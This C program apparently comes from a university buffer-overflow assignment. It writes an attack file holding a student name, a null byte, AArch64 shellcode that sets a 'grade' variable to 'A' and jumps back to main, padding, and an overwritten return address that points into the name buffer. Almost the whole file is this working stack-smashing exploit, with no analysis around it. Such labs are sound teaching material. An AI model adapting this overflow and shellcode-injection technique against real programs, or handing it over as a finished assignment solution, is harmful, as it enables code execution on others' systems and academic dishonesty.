/* Produces a file called dataA with the student name, a null byte,
padding to overrun the stack, and shellcode that sets grade='A'
followed by a branch back to main. The return address is overwritten
to point to the shellcode in the name array. */

#include <stdio.h>
#include <stdint.h>
#include "miniassembler.h"

/* Writes binary data to dataA file to exploit buffer overflow.
Takes no command line arguments, reads nothing from stdin,
writes attack data to dataA file, writes nothing to stdout,
returns 0 on success. */
int main(void) {
    FILE *fp;
    int i;
    uint64_t shellcode_addr;
    
    fp = fopen("dataA", "wb");
    
    /* Write student name */
    fwrite("Kevin", 1, 5, fp);
    
    /* Write null terminator */
    fputc('\0', fp);
    
    /* write shellcode as raw bytes (16 bytes total) */
    /* bytes implement: set grade='A', then branch back to main */
    unsigned char shellcode[] = {
        0x00, 0x88, 0x84, 0x10,  /* adr x0, 0x420044 (grade address)*/
        0x21, 0x08, 0x80, 0x52,  /* mov w1, #0x41 ('A') */
        0x01, 0x00, 0x00, 0x39,  /* strb w1, [x0] */
        0x0f, 0x81, 0xff, 0x17   /* b 0x40089c (main+64) */
    };
    
    /* Write shellcode bytes */
    fwrite(shellcode, 1, 16, fp);
    
    /* padding to fill remaining buf space (48 - 6 - 16 = 26 bytes) */
    for (i = 0; i < 26; i++) {
        fputc('A', fp);
    }
    
    /* target address 0x42005e (start of shellcode) in little-endian*/
    shellcode_addr = 0x42005e;
    fwrite(&shellcode_addr, sizeof(shellcode_addr), 1, fp);
    
    /* write final newline to terminate input properly */
    fputc('\n', fp);
    
    fclose(fp);
    return 0;
}